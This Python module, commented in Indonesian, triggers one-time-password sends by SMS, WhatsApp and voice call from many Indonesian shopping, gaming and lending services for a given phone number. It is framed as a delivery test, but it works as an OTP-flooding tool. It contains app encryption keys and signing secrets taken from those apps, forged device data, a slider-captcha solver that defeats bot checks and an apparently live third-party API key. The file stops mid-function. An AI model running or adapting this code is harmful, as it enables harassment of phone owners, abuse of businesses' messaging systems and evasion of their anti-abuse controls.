#!/usr/bin/env python3
# handlers.py - handler endpoint OTP (diverifikasi hidup 13 Nov 2026)
#
# Tiap handler meniru satu form "Kirim OTP" di situs resmi: hanya request publik,
# tanpa login dan tanpa menyimpan data. Dipakai untuk menguji apakah OTP benar-benar
# terkirim (SMS/WhatsApp) ke nomor uji.
#
# Setiap handler menerima (n08, n62, raw) dan mengembalikan tuple:
#   (ok: bool, detail: str)
# n08 = 0812xxx | n62 = 62812xxx | raw = input asli user

import base64
import hashlib
import json
import os
import random
import re
import string
import time
import urllib.parse
import uuid

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from utils import fmt_08, fmt_plus, headers, ua

TIMEOUT = 15
LIMIT_WORDS = ("limit", "terlalu", "sering", "too many", "exceeded", "cooldown")


def _classify(code: int, text: str, ok_code=(200, 201, 202)):
    if code in ok_code:
        return True, "OTP sent"
    low = (text or "").lower()
    if code == 429 or any(w in low for w in LIMIT_WORDS):
        return False, "rate limit"
    if code in (401, 403):
        return False, f"diblokir ({code})"
    return False, f"gagal ({code})"


def _json(resp):
    try:
        return resp.json()
    except Exception:
        return {}


# =====================================================================
# 1. DUNIA GAMES  (SMS)
# =====================================================================
def dunia_games(n08, n62, raw):
    r = requests.post(
        "https://api.duniagames.co.id/api/user/api/v2/user/send-otp",
        json={"phoneNumber": fmt_plus(n62), "userName": n08},
        headers=headers({
            "Content-Type": "application/json",
            "Origin": "https://duniagames.co.id",
            "Referer": "https://duniagames.co.id/",
            "x-device": str(uuid.uuid4()),
        }),
        timeout=TIMEOUT,
    )
    low = r.text.lower()
    if "verification code that has been sent" in low:
        return True, "OTP SMS terkirim"
    if "wait" in low and "again" in low:
        return False, "cooldown"
    if r.status_code in (401, 429):
        return False, "cooldown"
    if r.status_code == 200:
        return True, "OTP SMS terkirim"
    return _classify(r.status_code, r.text)


# =====================================================================
# 2. TOKOPEDIA  (WhatsApp)
# =====================================================================
def tokopedia(n08, n62, raw):
    s = requests.Session()
    s.headers.update(headers())
    ld = "https%3A%2F%2Faccounts.tokopedia.com%2Fregister"
    page = s.get(
        f"https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={n08}&ld={ld}",
        timeout=TIMEOUT,
    )
    m = re.search(r'<input\s+id="Token"\s+value="(.*?)"\s+type="hidden">', page.text)
    token = m.group(1) if m else ""
    r = s.post(
        "https://accounts.tokopedia.com/otp/c/ajax/request-wa",
        data={
            "otp_type": "116", "msisdn": n08, "tk": token, "email": "",
            "original_param": "", "user_id": "", "signature": "", "number_otp_digit": "6",
        },
        headers=headers({
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://accounts.tokopedia.com",
            "Referer": "https://accounts.tokopedia.com/otp/c/page",
            "X-Requested-With": "XMLHttpRequest",
        }) | {"User-Agent": s.headers.get("User-Agent", ua())},
        timeout=TIMEOUT,
    )
    if r.status_code == 200 and _json(r).get("success") is True:
        return True, "OTP WhatsApp terkirim"
    return _classify(r.status_code, r.text)


def tokopedia_sms(n08, n62, raw):
    s = requests.Session()
    s.headers.update(headers())
    ld = "https%3A%2F%2Faccounts.tokopedia.com%2Fregister"
    page = s.get(
        f"https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={n08}&ld={ld}",
        timeout=TIMEOUT,
    )
    m = re.search(r'<input\s+id="Token"\s+value="(.*?)"\s+type="hidden">', page.text)
    token = m.group(1) if m else ""
    r = s.post(
        "https://accounts.tokopedia.com/otp/c/ajax/request-sms",
        data={
            "otp_type": "116", "msisdn": n08, "tk": token, "email": "",
            "original_param": "", "user_id": "", "signature": "", "number_otp_digit": "6",
        },
        headers=headers({
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://accounts.tokopedia.com",
            "Referer": "https://accounts.tokopedia.com/otp/c/page",
            "X-Requested-With": "XMLHttpRequest",
        }) | {"User-Agent": s.headers.get("User-Agent", ua())},
        timeout=TIMEOUT,
    )
    d = _json(r)
    if r.status_code == 200 and d.get("success") is True:
        return True, "OTP SMS terkirim"
    return _classify(r.status_code, d.get("error_message") or d.get("message") or r.text)


# =====================================================================
# 3. BONUS BELANJA  (WhatsApp & SMS)
# =====================================================================
def bonus_belanja(n08, n62, raw):
    r = requests.post(
        "https://www.bonusbelanja.com/api/auth/registration/app",
        json={"phone": n08, "name": "User", "agreeTnc": True, "agreeContact": True},
        headers=headers({
            "Content-Type": "application/json",
            "Origin": "https://www.bonusbelanja.com",
            "Referer": "https://www.bonusbelanja.com/register/",
        }),
        timeout=TIMEOUT,
    )
    d = _json(r)
    if r.status_code in (200, 201) and d.get("error") is False:
        return True, "OTP WhatsApp terkirim"
    return _classify(r.status_code, r.text)


def bonus_belanja_sms(n08, n62, raw):
    r = requests.post(
        "https://www.bonusbelanja.com/api/auth/registration/app",
        json={"phone": n08, "name": "User", "agreeTnc": True, "agreeContact": True, "method": "sms"},
        headers=headers({
            "Content-Type": "application/json",
            "Origin": "https://www.bonusbelanja.com",
            "Referer": "https://www.bonusbelanja.com/register/",
        }),
        timeout=TIMEOUT,
    )
    d = _json(r)
    if r.status_code in (200, 201) and d.get("error") is False:
        return True, "OTP SMS terkirim"
    return _classify(r.status_code, r.text)


bonusbelanja_sms = bonus_belanja_sms


def bonus_belanja_voice(n08, n62, raw):
    r = requests.post(
        "https://www.bonusbelanja.com/api/auth/registration/app",
        json={"phone": n08, "name": "User", "agreeTnc": True, "agreeContact": True, "method": "voice"},
        headers=headers({
            "Content-Type": "application/json",
            "Origin": "https://www.bonusbelanja.com",
            "Referer": "https://www.bonusbelanja.com/register/",
        }),
        timeout=TIMEOUT,
    )
    d = _json(r)
    if r.status_code in (200, 201) and d.get("error") is False:
        return True, "OTP Voice Call terkirim"
    return _classify(r.status_code, r.text)


bonusbelanja_voice = bonus_belanja_voice


# =====================================================================
# 4. MAPCLUB  (SMS)
# =====================================================================
def mapclub(n08, n62, raw):
    r = requests.post(
        "https://beryllium.mapclub.com/api/member/registration/sms/otp",
        data=json.dumps({"account": n08}),
        headers=headers({
            "Content-Type": "application/json",
            "Authorization": "Bearer",
            "Client-Platform": "WEB",
            "Origin": "https://www.mapclub.com",
            "Referer": "https://www.mapclub.com/",
        }),
        timeout=TIMEOUT,
    )
    d = _json(r)
    if r.status_code == 200 and d.get("success") is True:
        return True, "OTP SMS terkirim"
    if isinstance(d.get("data"), list) and d["data"] and "timeRemaining" in d["data"][0]:
        return False, "sudah dikirim (cooldown)"
    return _classify(r.status_code, r.text)


# =====================================================================
# 5. CAIRIN  (SMS & Voice Call)
# =====================================================================
def cairin(n08, n62, raw):
    r = requests.post(
        "https://app.cairin.id/v1/app/sms/sendCaptcha",
        json={
            "haveImageCode": "0", "fileName": "6f8c3b90c845f09ff1bfe714a30aede8",
            "phone": n08, "imageCode": "0", "userImei": "860000000000001",
            "type": "registry", "verifySend": "1",
        },
        headers=headers({"Content-Type": "application/json;charset=UTF-8"}),
        timeout=TIMEOUT,
    )
    d = _json(r)
    code = str(d.get("code", ""))
    if r.status_code == 200 and code in ("0", "20000", "30101"):
        return True, "OTP SMS terkirim"
    return _classify(r.status_code, r.text)


def cairin_voice(n08, n62, raw):
    r = requests.post(
        "https://app.cairin.id/v1/app/sms/sendCaptcha",
        json={
            "haveImageCode": "0", "fileName": "6f8c3b90c845f09ff1bfe714a30aede8",
            "phone": n08, "imageCode": "0", "userImei": "860000000000001",
            "type": "registry", "verifySend": "1", "channel": "voice",
        },
        headers=headers({"Content-Type": "application/json;charset=UTF-8"}),
        timeout=TIMEOUT,
    )
    d = _json(r)
    code = str(d.get("code", ""))
    if r.status_code == 200 and code in ("0", "20000", "30101"):
        return True, "OTP Voice Call terkirim"
    return _classify(r.status_code, r.text)


# =====================================================================
# 6. INDOSAKU  (OTP pinjol - AES)
# =====================================================================
_INDOSAKU_KEY = b"b0b53117-94ab-424f-91c4-10a78f42"


def _aes_ecb_enc(key: bytes, raw: bytes) -> str:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
    return base64.b64encode(AES.new(key, AES.MODE_ECB).encrypt(pad(raw, 16))).decode()


def _aes_ecb_dec(key: bytes, blob: str) -> str:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad
    clean = blob.strip().strip('"')
    return unpad(AES.new(key, AES.MODE_ECB).decrypt(base64.b64decode(clean)), 16).decode()


def indosaku(n08, n62, raw):
    payload = {"cVWzn1Oq": 1, "e8dv2iH": "INSA4", "yidTRs": n08[1:],
               "mKm0HT8WuK": "1", "fnKDg": "Google"}
    body = _aes_ecb_enc(_INDOSAKU_KEY, json.dumps(payload, separators=(",", ":")).encode())
    r = requests.post(
        "https://app.indosaku.id/jdn49uXCY9hp/mvNa/f8t_UdUf",
        data=body,
        headers={
            "bZ6LZqlrL6vMGIwhALp": "IND", "rGjS96": "112", "lAsnNVkU0U9C": "android",
            "g9Z76E9boK": "Google", "x6FDnYreNpNWph": "", "b9uMD": os.urandom(8).hex(),
            "Content-Type": "application/json; charset=UTF-8", "User-Agent": "okhttp/4.12.0",
        },
        timeout=TIMEOUT,
    )
    text = r.text
    try:
        if not text.strip().startswith("{"):
            text = _aes_ecb_dec(_INDOSAKU_KEY, text)
        d = json.loads(text)
    except Exception:
        return _classify(r.status_code, r.text)
    if d.get("code") == 200 and (d.get("data") or {}).get("tsFzo") == 1:
        return True, "OTP terkirim"
    return False, str(d.get("message") or d.get("code"))[:40]


def indosaku_voice(n08, n62, raw):
    payload = {"cVWzn1Oq": 2, "e8dv2iH": "INSA4", "yidTRs": n08[1:],
               "mKm0HT8WuK": "2", "fnKDg": "Google"}
    body = _aes_ecb_enc(_INDOSAKU_KEY, json.dumps(payload, separators=(",", ":")).encode())
    r = requests.post(
        "https://app.indosaku.id/jdn49uXCY9hp/mvNa/f8t_UdUf",
        data=body,
        headers={
            "bZ6LZqlrL6vMGIwhALp": "IND", "rGjS96": "112", "lAsnNVkU0U9C": "android",
            "g9Z76E9boK": "Google", "x6FDnYreNpNWph": "", "b9uMD": os.urandom(8).hex(),
            "Content-Type": "application/json; charset=UTF-8", "User-Agent": "okhttp/4.12.0",
        },
        timeout=TIMEOUT,
    )
    text = r.text
    try:
        if not text.strip().startswith("{"):
            text = _aes_ecb_dec(_INDOSAKU_KEY, text)
        d = json.loads(text)
    except Exception:
        return _classify(r.status_code, r.text)
    if d.get("code") == 200 and (d.get("data") or {}).get("tsFzo") == 1:
        return True, "OTP Voice Call terkirim"
    return False, str(d.get("message") or d.get("code"))[:40]


def indosaku_wa(n08, n62, raw):
    payload = {"cVWzn1Oq": 3, "e8dv2iH": "INSA4", "yidTRs": n08[1:],
               "mKm0HT8WuK": "3", "fnKDg": "Google"}
    body = _aes_ecb_enc(_INDOSAKU_KEY, json.dumps(payload, separators=(",", ":")).encode())
    r = requests.post(
        "https://app.indosaku.id/jdn49uXCY9hp/mvNa/f8t_UdUf",
        data=body,
        headers={
            "bZ6LZqlrL6vMGIwhALp": "IND", "rGjS96": "112", "lAsnNVkU0U9C": "android",
            "g9Z76E9boK": "Google", "x6FDnYreNpNWph": "", "b9uMD": os.urandom(8).hex(),
            "Content-Type": "application/json; charset=UTF-8", "User-Agent": "okhttp/4.12.0",
        },
        timeout=TIMEOUT,
    )
    text = r.text
    try:
        if not text.strip().startswith("{"):
            text = _aes_ecb_dec(_INDOSAKU_KEY, text)
        d = json.loads(text)
    except Exception:
        return _classify(r.status_code, r.text)
    if d.get("code") == 200 and (d.get("data") or {}).get("tsFzo") == 1:
        return True, "OTP WhatsApp terkirim"
    return False, str(d.get("message") or d.get("code"))[:40]


# =====================================================================
# 7. KREDIONE  (WhatsApp - signed)
# =====================================================================
_KREDIONE_GW = (
    "YyQyCaWdilrUL3oFZ6oeS8ZvWxHuGkmFsTZvq3eKYLyMY3autqJK2ik7EzuMpaCRBJ5ojwB3Ffs9vSqhT67Kx"
    "G3KbAiQgf12qNZDGYfVaAEtscbJXCcGvSDIWsbuZkmyH5NzlcsZsOR90HvGPZCD9OFcIYbksqfoDcLISB8kFaONi7"
    "TwYpofSuJLYGaJvDROyeG74kvJCriGBICGZE3MDVWej7pXaUtSnofre6GFJhUD673thInTvDLFiw7yS1GF"
)
_KREDIONE_AES = "5KF4efouyBWmx643Hps1uw=="
_KREDIONE_PATH = "/idn-app-server/api/v2/verification/send_code/"


def kredione(n08, n62, raw):
    ts = int(time.time() * 1000)
    fields = {
        "api_gw_public_key": _KREDIONE_GW, "app_id": "10000000006666001",
        "merchant_no": "6666XF20230306001", "method_name": _KREDIONE_PATH, "msg_id": "666",
        "request_method": "post", "sign_timestamp": ts,
    }
    raw_sign = ""
    for k in sorted(fields):
        raw_sign += ("timestamp" + str(fields[k])) if k == "sign_timestamp" else (k + str(fields[k]))
    sign = hashlib.md5(f"secret{_KREDIONE_AES}{raw_sign}{_KREDIONE_AES}secret".upper().encode()).hexdigest()
    hdr = {
        "channel": "com.id.kredi360", "appMerchant": "ZF_360_CREDIT", "appId": "12",
        "Content-Type": "application/json;charset=UTF-8", "merchant_no": "6666XF20230306001",
        "msg_id": "666", "app_id": "10000000006666001", "method_name": _KREDIONE_PATH,
        "request_method": "post", "sign_timestamp": str(ts), "api_gw_public_key": _KREDIONE_GW,
        "request_sign": sign, "Origin": "https://m.kredione.id", "Referer": "https://m.kredione.id/",
        "User-Agent": ua(),
    }
    q = urllib.parse.urlencode({"method": "whatsapp", "reason": "register", "phone_number": n08})
    r = requests.post(f"https://m.kredione.id/gateway{_KREDIONE_PATH}?{q}", headers=hdr, timeout=TIMEOUT)
    d = _json(r)
    if r.status_code == 200 and (d.get("suc") is True or d.get("status") == 0):
        return True, "OTP WhatsApp terkirim"
    return _classify(r.status_code, r.text)


def kredione_sms(n08, n62, raw):
    ts = int(time.time() * 1000)
    fields = {
        "api_gw_public_key": _KREDIONE_GW, "app_id": "10000000006666001",
        "merchant_no": "6666XF20230306001", "method_name": _KREDIONE_PATH, "msg_id": "666",
        "request_method": "post", "sign_timestamp": ts,
    }
    raw_sign = ""
    for k in sorted(fields):
        raw_sign += ("timestamp" + str(fields[k])) if k == "sign_timestamp" else (k + str(fields[k]))
    sign = hashlib.md5(f"secret{_KREDIONE_AES}{raw_sign}{_KREDIONE_AES}secret".upper().encode()).hexdigest()
    hdr = {
        "channel": "com.id.kredi360", "appMerchant": "ZF_360_CREDIT", "appId": "12",
        "Content-Type": "application/json;charset=UTF-8", "merchant_no": "6666XF20230306001",
        "msg_id": "666", "app_id": "10000000006666001", "method_name": _KREDIONE_PATH,
        "request_method": "post", "sign_timestamp": str(ts), "api_gw_public_key": _KREDIONE_GW,
        "request_sign": sign, "Origin": "https://m.kredione.id", "Referer": "https://m.kredione.id/",
        "User-Agent": ua(),
    }
    q = urllib.parse.urlencode({"method": "sms", "reason": "register", "phone_number": n08})
    r = requests.post(f"https://m.kredione.id/gateway{_KREDIONE_PATH}?{q}", headers=hdr, timeout=TIMEOUT)
    d = _json(r)
    if r.status_code == 200 and (d.get("suc") is True or d.get("status") == 0):
        return True, "OTP SMS terkirim"
    return _classify(r.status_code, r.text)


def kredione_voice(n08, n62, raw):
    ts = int(time.time() * 1000)
    fields = {
        "api_gw_public_key": _KREDIONE_GW, "app_id": "10000000006666001",
        "merchant_no": "6666XF20230306001", "method_name": _KREDIONE_PATH, "msg_id": "666",
        "request_method": "post", "sign_timestamp": ts,
    }
    raw_sign = ""
    for k in sorted(fields):
        raw_sign += ("timestamp" + str(fields[k])) if k == "sign_timestamp" else (k + str(fields[k]))
    sign = hashlib.md5(f"secret{_KREDIONE_AES}{raw_sign}{_KREDIONE_AES}secret".upper().encode()).hexdigest()
    hdr = {
        "channel": "com.id.kredi360", "appMerchant": "ZF_360_CREDIT", "appId": "12",
        "Content-Type": "application/json;charset=UTF-8", "merchant_no": "6666XF20230306001",
        "msg_id": "666", "app_id": "10000000006666001", "method_name": _KREDIONE_PATH,
        "request_method": "post", "sign_timestamp": str(ts), "api_gw_public_key": _KREDIONE_GW,
        "request_sign": sign, "Origin": "https://m.kredione.id", "Referer": "https://m.kredione.id/",
        "User-Agent": ua(),
    }
    q = urllib.parse.urlencode({"method": "voice", "reason": "register", "phone_number": n08})
    r = requests.post(f"https://m.kredione.id/gateway{_KREDIONE_PATH}?{q}", headers=hdr, timeout=TIMEOUT)
    d = _json(r)
    if r.status_code == 200 and (d.get("suc") is True or d.get("status") == 0):
        return True, "OTP Voice Call terkirim"
    return _classify(r.status_code, r.text)


# =====================================================================
# 8. KREDITNAVIGATOR  (OTP pinjol - AES + device register)
# =====================================================================
_KN_BASE = "https://buzzly.nexlendquontic.com/uploadtool/"
_KN_KEY, _KN_IV = b"98cCLqPsTpEZXFu1", b"A2FtdvL7ewBOHc3t"
_KN_CLIENT = "46pF5ta0gyLIV6sz"


def _kn_enc(text: str) -> str:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
    return base64.b64encode(AES.new(_KN_KEY, AES.MODE_CBC, _KN_IV).encrypt(pad(text.encode(), 16))).decode()


def _kn_dec(text: str) -> str:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad
    return unpad(AES.new(_KN_KEY, AES.MODE_CBC, _KN_IV).decrypt(base64.b64decode(text.strip().strip('"'))), 16).decode()


def _kn_device(android_id: str, user_id: str = "") -> dict:
    return {
        "aawp": 1, "unpd": _KN_CLIENT, "oiuaua": "1.1.6", "mtz": 6,
        "fojie": "com.dana.kredit.navigator", "jebrmbxz": "app", "gkzcowuo": user_id,
        "hpiizoni": {
            "lkioasz": "00000000-0000-0000-0000-000000000000", "bnbrdp": "SM-G991B",
            "spi": "samsung", "bbuvlb": "12", "qnw": 31, "hjqy": "", "dcr": "",
            "qpfpaotm": android_id,
        },
        "wvhkpls": "", "vxfrx": 1, "sgqq": 1, "wsg": "android",
    }


def _kn_post(path: str, body: str):
    return requests.post(
        _KN_BASE + path, data=body.encode(),
        headers={"Content-Type": "application/json;charset=utf-8"}, timeout=TIMEOUT,
    )


def kreditnavigator(n08, n62, raw):
    aid = uuid.uuid4().hex[:16]
    boot = {
        "vfwt": {"odywqsjc": "", "rpbpyxgh": aid, "qcurs": 0, "levchzj": 0, "ljpggxmh": 1,
                 "dtqp": "00000000-0000-0000-0000-000000000000"},
        "psyhkiwd": _kn_device(aid),
    }
    resp = _kn_post("device/user/create", _kn_enc(json.dumps(boot, separators=(",", ":"))))
    try:
        result = json.loads(resp.text)
        if isinstance(result, str):
            result = json.loads(_kn_dec(result))
    except Exception:
        return _classify(resp.status_code, resp.text)
    uid = (result.get("gan") or {}).get("ujieqzbw")
    if not uid:
        return False, "device register gagal"

    body = _kn_enc(json.dumps({
        "vfwt": {"ogeuvrfa": n08, "xyldzdmx": "TEXT", "tvafse": 0},
        "psyhkiwd": _kn_device(aid, uid),
    }, separators=(",", ":")))
    r = _kn_post("user-service/text-message", body)
    try:
        out = json.loads(r.text)
        if isinstance(out, str):
            out = json.loads(_kn_dec(out))
    except Exception:
        return _classify(r.status_code, r.text)
    if out.get("lil") == 0:
        return True, "OTP terkirim"
    return False, str(out.get("siauesll") or "gagal")[:40]


def kreditnavigator_voice(n08, n62, raw):
    aid = uuid.uuid4().hex[:16]
    boot = {
        "vfwt": {"odywqsjc": "", "rpbpyxgh": aid, "qcurs": 0, "levchzj": 0, "ljpggxmh": 1,
                 "dtqp": "00000000-0000-0000-0000-000000000000"},
        "psyhkiwd": _kn_device(aid),
    }
    resp = _kn_post("device/user/create", _kn_enc(json.dumps(boot, separators=(",", ":"))))
    try:
        result = json.loads(resp.text)
        if isinstance(result, str):
            result = json.loads(_kn_dec(result))
    except Exception:
        return _classify(resp.status_code, resp.text)
    uid = (result.get("gan") or {}).get("ujieqzbw")
    if not uid:
        return False, "device register gagal"

    body = _kn_enc(json.dumps({
        "vfwt": {"ogeuvrfa": n08, "xyldzdmx": "VOICE", "tvafse": 0},
        "psyhkiwd": _kn_device(aid, uid),
    }, separators=(",", ":")))
    r = _kn_post("user-service/text-message", body)
    try:
        out = json.loads(r.text)
        if isinstance(out, str):
            out = json.loads(_kn_dec(out))
    except Exception:
        return _classify(r.status_code, r.text)
    if out.get("lil") == 0:
        return True, "OTP Voice Call terkirim"
    return False, str(out.get("siauesll") or "gagal")[:40]


def kreditnavigator_wa(n08, n62, raw):
    aid = uuid.uuid4().hex[:16]
    boot = {
        "vfwt": {"odywqsjc": "", "rpbpyxgh": aid, "qcurs": 0, "levchzj": 0, "ljpggxmh": 1,
                 "dtqp": "00000000-0000-0000-0000-000000000000"},
        "psyhkiwd": _kn_device(aid),
    }
    resp = _kn_post("device/user/create", _kn_enc(json.dumps(boot, separators=(",", ":"))))
    try:
        result = json.loads(resp.text)
        if isinstance(result, str):
            result = json.loads(_kn_dec(result))
    except Exception:
        return _classify(resp.status_code, resp.text)
    uid = (result.get("gan") or {}).get("ujieqzbw")
    if not uid:
        return False, "device register gagal"

    body = _kn_enc(json.dumps({
        "vfwt": {"ogeuvrfa": n08, "xyldzdmx": "WHATSAPP", "tvafse": 0},
        "psyhkiwd": _kn_device(aid, uid),
    }, separators=(",", ":")))
    r = _kn_post("user-service/text-message", body)
    try:
        out = json.loads(r.text)
        if isinstance(out, str):
            out = json.loads(_kn_dec(out))
    except Exception:
        return _classify(r.status_code, r.text)
    if out.get("lil") == 0:
        return True, "OTP WhatsApp terkirim"
    return False, str(out.get("siauesll") or "gagal")[:40]


# =====================================================================
# 9. RUPIAHCEPAT  (OTP pinjol - AES-CBC)
# =====================================================================
_RC_BASE = "https://apiservice.rupiahcepatweb.com"
_RC_KEY = "889511be9163d0d23997851e61033282"
_RC_IV = "ec1d0eafaa9bbc096dfe255c86db9905"
_RC_SALT = "&97dab6b088ad"


def _rc_body(n08: str) -> str:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad

    uid = str(int(time.time() * 1000)) + "".join(random.choice("0123456789abcdef") for _ in range(12))
    now = str(int(time.time() * 1000))
    base = {
        "access_token": "", "city": "", "app_free_memory": "", "longitude": "0",
        "total_boot_time_wake": "", "ui_version": "", "noise": "", "battery_max": "",
        "app_avaliable_memory": "", "app_version": "9.9.9", "app_version_code": "999",
        "version_code": "999", "platform": "h5", "app_max_memory": "", "brand": "",
        "manufacturer": "", "mem": "", "tz": "", "total_boot_time": "", "lat": "0",
        "latitude": "0", "is_sim": "0", "is_simulator": "0", "lon": "0", "is_tt": "0",
        "time_zone": "", "cpu_num": "", "product": "", "device": "", "is_google_service": "0",
        "battery_level": "0.7", "uuid": uid, "request_time": now, "uptime": now, "rcid": uid,
        "net": "other", "model": "", "width": "412", "network": "other", "height": "915",
        "os": "other", "mobile": n08, "sms_type": "8", "otp_channel": "2",
    }
    raw_sign = "&".join(f"{k}={base[k]}" for k in sorted(base)[:20])
    base["signature"] = hashlib.md5((raw_sign + _RC_SALT).encode()).hexdigest()
    blob = AES.new(bytes.fromhex(_RC_KEY), AES.MODE_CBC, bytes.fromhex(_RC_IV)).encrypt(
        pad(json.dumps(base, separators=(",", ":")).encode(), 16)
    )
    return urllib.parse.quote(base64.b64encode(blob).decode(), safe="")


def rupiahcepat(n08, n62, raw):
    r = requests.post(
        _RC_BASE + "/api/v2/request_auth_code",
        data="data=" + _rc_body(n08),
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://h5.rupiahcepat.co.id", "Referer": "https://h5.rupiahcepat.co.id/",
            "User-Agent": ua(), "x-app-version-code": "999", "x-platform": "h5-whatsapp",
        },
        timeout=TIMEOUT,
    )
    d = _json(r)
    if r.status_code == 200 and d.get("code") == 0:
        return True, "OTP terkirim"
    return _classify(r.status_code, r.text)


# =====================================================================
# 10. ADAKAMI  (slider captcha, butuh opencv + numpy)
# =====================================================================
def _solve_slider(challenge: dict) -> float | None:
    try:
        import cv2
        import numpy as np
    except ImportError:
        return None
    orig = cv2.imdecode(np.frombuffer(base64.b64decode(challenge["originalImage"]), np.uint8), cv2.IMREAD_COLOR)
    piece = cv2.imdecode(np.frombuffer(base64.b64decode(challenge["slidingImage"]), np.uint8), cv2.IMREAD_UNCHANGED)
    mask = piece[:, :, 3] if piece.shape[2] == 4 else None
    tpl = piece[:, :, :3]
    res = cv2.matchTemplate(orig, tpl, cv2.TM_SQDIFF_NORMED, mask=mask)
    h_img, h_tpl = orig.shape[0], tpl.shape[0]
    expected = round(float(challenge["targetYHeightPercent"]) * h_img)
    lo = max(0, expected - 3)
    hi = min(h_img - h_tpl, expected + 3)
    if hi < lo:
        lo, hi = 0, h_img - h_tpl
    _, _, min_loc, _ = cv2.minMaxLoc(res[lo:hi + 1, :])
    return min_loc[0] / orig.shape[1]


def adakami(n08, n62, raw):
    s = requests.Session()
    s.headers.update({
        "User-Agent": ua(), "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "Origin": "https://h5.adakami.id", "Referer": "https://h5.adakami.id/landing/register?id=64",
        "x-ada-os": "android", "x-client": "h5",
    })
    s.get("https://h5.adakami.id/landing/register?id=64&skin=newUI&needAbTest=false", timeout=TIMEOUT)
    for _ in range(3):
        r = s.post("https://h5.adakami.id/api/h5/verificationCode/slider", json={"verifyToken": n08}, timeout=TIMEOUT)
        data = _json(r)
        if data.get("result") != 0:
            return _classify(r.status_code, r.text)
        ch = data["content"]
        x = _solve_slider(ch)
        if x is None:
            return False, "butuh opencv (pip install opencv-python-headless)"
        # geseran maksimum di UI = (lebar asli - lebar potongan) / lebar asli
        try:
            x_max = (float(ch["targetXWidthOri"]) - float(ch["slidingXWidthOri"])) / float(ch["targetXWidthOri"])
            x = max(0.0, min(x, x_max))
        except (KeyError, ValueError, ZeroDivisionError):
            pass
        r2 = s.post("https://h5.adakami.id/api/h5/verifySlider", json={
            "targetXWidthPresent": x, "msgType": 0, "verifyToken": n08, "mobile": n08,
            "verificationToken": ch.get("verificationToken") or "",
        }, timeout=TIMEOUT)
        out = _json(r2)
        if out.get("result") == 0:
            return True, "OTP terkirim"
        if out.get("result") not in (-2, -95, 101021):
            return False, str(out.get("resultMessage") or out.get("result"))[:40]
    return False, "slider gagal"


# =====================================================================
# 11. PAXBAR  (agregator, 1 request = banyak provider)
# =====================================================================
def paxbar(n08, n62, raw):
    key = os.environ.get("PAXBAR_KEY", "pxbr_live_co8touhm9hr4s7z0l9ikxa08")
    r = requests.get(f"https://api.paxbar.id/api/v1/otp?nomor={n62}&apiKey={key}", timeout=25)
    d = _json(r)
    if d.get("success") or d.get("status") == "success":
        return True, str(d.get("message", "OTP sent"))[:40]
    return False, str(d.get("message", f"HTTP {r.status_code}"))[:40]


# =====================================================================
# 12. ADIRAKU  (WhatsApp)
# =====================================================================
def adiraku(n08, n62, raw):
    try:
        r = requests.post(
            "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata",
            json={"mobileNumber": n08, "type": "prospect-create", "channel": "whatsapp"},
            headers=headers({"Content-Type": "application/json; charset=utf-8",
                             "Origin": "https://adiraku.co.id"}),
            timeout=TIMEOUT,
            verify=False,
        )
    except Exception as e:
        return False, str(e)[:40]
    d = _json(r)
    if d.get("message") == "success" or (d.get("data") or {}).get("messageIsSent"):
        return True, "OTP WhatsApp terkirim"
    if r.status_code == 400:
        return False, "cooldown"
    return _classify(r.status_code, r.text)


def adiraku_sms(n08, n62, raw):
    try:
        r = requests.post(
            "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata",
            json={"mobileNumber": n08, "type": "prospect-create", "channel": "sms"},
            headers=headers({"Content-Type": "application/json; charset=utf-8",
                             "Origin": "https://adiraku.co.id"}),
            timeout=TIMEOUT,
            verify=False,
        )
    except Exception as e:
        return False, str(e)[:40]
    d = _json(r)
    if d.get("message") == "success" or (d.get("data") or {}).get("messageIsSent"):
        return True, "OTP SMS terkirim"
    if r.status_code == 400:
        return False, "cooldown"
    return _classify(r.status_code, r.text)


def adiraku_voice(n08, n62, raw):
    try:
        r = requests.post(
            "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata",
            json={"mobileNumber": n08, "type": "prospect-create", "channel": "voice"},
            headers=headers({"Content-Type": "application/json; charset=utf-8",
                             "Origin": "https://adiraku.co.id"}),
            timeout=TIMEOUT,
            verify=False,
        )
    except Exception as e:
        return False, str(e)[:40]
    d = _json(r)
    if d.get("message") == "success" or (d.get("data") or {}).get("messageIsSent"):
        return True, "OTP Voice Call terkirim"
    if r.status_code == 400:
        return False, "cooldown"
    return _classify(r.status_code, r.text)


# =====================================================================
# 13. SINGA  (WhatsApp & SMS)
# =====================================================================
def singa(n08, n62, raw):
    r = requests.post(
        "https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.7&versionCode=153"
        "&model=vivo&systemVersion=16&platform=android&appsflyer_id=",
        json={"mobile_phone": n08, "type": "mobile", "is_switchable": 1},
        headers=headers({"Content-Type": "application/json"}),
        timeout=TIMEOUT,
    )
    d = _json(r)
    msg = str(d.get("msg", "")).lower()
    if d.get("code") == 200 or msg == "success":
        return True, "OTP WhatsApp terkirim"
    if d.get("code") == 201 or "terlalu sering" in msg or "sering" in msg:
        return False, "cooldown"
    return False, str(d.get("msg") or f"gagal ({r.status_code})")[:40]


def singa_sms(n08, n62, raw):
    r = requests.post(
        "https://api102.singa.id/new/login/sendCode?versionName=2.4.7&versionCode=153"
        "&model=vivo&systemVersion=16&platform=android&appsflyer_id=",
        json={"mobile_phone": n08, "type": "mobile", "is_switchable": 1},
        headers=headers({"Content-Type": "application/json"}),
        timeout=TIMEOUT,
    )
    d = _json(r)
    msg = str(d.get("msg", "")).lower()
    if d.get("code") == 200 or msg == "success":
        return True, "OTP SMS terkirim"
    if d.get("code") == 201 or "terlalu sering" in msg or "sering" in msg:
        return False, "cooldown"
